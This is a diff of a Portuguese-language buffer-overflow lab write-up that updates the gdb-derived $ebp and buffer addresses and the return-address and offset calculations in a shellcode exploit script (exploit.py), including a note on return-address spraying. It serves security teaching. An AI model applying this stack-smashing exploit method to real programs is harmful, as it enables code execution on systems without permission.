@@ -87,14 +87,14 @@ Depois de meter um breakpoint na função **bof()**, executar o programa e dar a
 p $ebp
 ```
 
-Que retornou `(void *) 0xffffcb18`.<br>
+Que retornou `(void *) 0xffffca88`.<br>
 Podemos fazer o mesmo para descobrir o endereço do buffer:
 
 ```
 p &buffer
 ```
 
-Que retornou `0xffffcaac`.<br>
+Que retornou `0xffffca1c`.<br>
 
 Por fim, alteramos o ficheiro `exploit.py` para ter os valores dos endereços obtidos. O ficheiro final ficou assim:
 
@@ -119,8 +119,8 @@ content[start:start + len(shellcode)] = shellcode
 
 # Decide the return address value 
 # and put it somewhere in the payload
-ret    = 0xffffcb18 + 190
-offset = 0xffffcb18 - 0xffffcaac + 4
+ret    = 0xffffca88 + 190
+offset = 0xffffca88 - 0xffffca1c + 4
 
 L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
 content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
@@ -144,8 +144,8 @@ Para calcular o return address basta pegar no valor do **$ebp** e somar um núme
 Para calcular o offset, temos que subtrair ao **$ebp** o valor do endereço do **buffer** e somar 4, para incluir o antigo return address:
 
 ```py
-ret    = 0xffffcb18 + 190
-offset = 0xffffcb18 - 0xffffcaac + 4
+ret    = 0xffffca88 + 190
+offset = 0xffffca88 - 0xffffca1c + 4
 ```
 
 Finalmente, corremos o `exploit.py`, que vai criar o `badfile`, seguido do `stack-L1` e obtemos a seguinte mensagem:
@@ -185,8 +185,8 @@ content[start:start + len(shellcode)] = shellcode
 
 # Decide the return address value 
 # and put it somewhere in the payload
-ret    = 0xffffcaac + 420
-#offset = 0xffffcb18 - 0xffffcaac + 4  # Não é necessário para este caso
+ret    = 0xffffca1c + 420
+#offset = 0xffffca88 - 0xffffca1c + 4  # Não é necessário para este caso
 
 L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
 
@@ -203,7 +203,7 @@ Desta vez, como não temos o **$ebp** para calcular o **ret**, usamos o endereç
 Portanto, o novo return address ficou com o valor:
 
 ```py
-ret = 0xffffcaac + 420
+ret = 0xffffca1c + 420
 ```
 
 Por fim, não podemos calcular onde colocar o novo return address como no exercício anterior, portanto recorremos a **spraying**:
